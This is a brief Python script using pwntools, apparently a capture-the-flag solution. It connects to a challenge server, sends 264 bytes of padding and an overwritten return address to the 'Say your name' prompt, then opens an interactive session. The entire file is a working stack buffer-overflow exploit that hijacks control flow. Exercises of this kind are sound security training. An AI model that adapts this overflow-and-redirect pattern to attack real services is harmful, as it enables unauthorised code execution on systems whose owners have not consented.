from pwn import *
p = remote('chals20.cybercastors.com',14425)
padd = "a" * 264
addr = p64(0x4006e7)
payload = ""
payload += padd
payload += addr
p.recvuntil("Say your name: ")
p.sendline(payload)
p.interactive()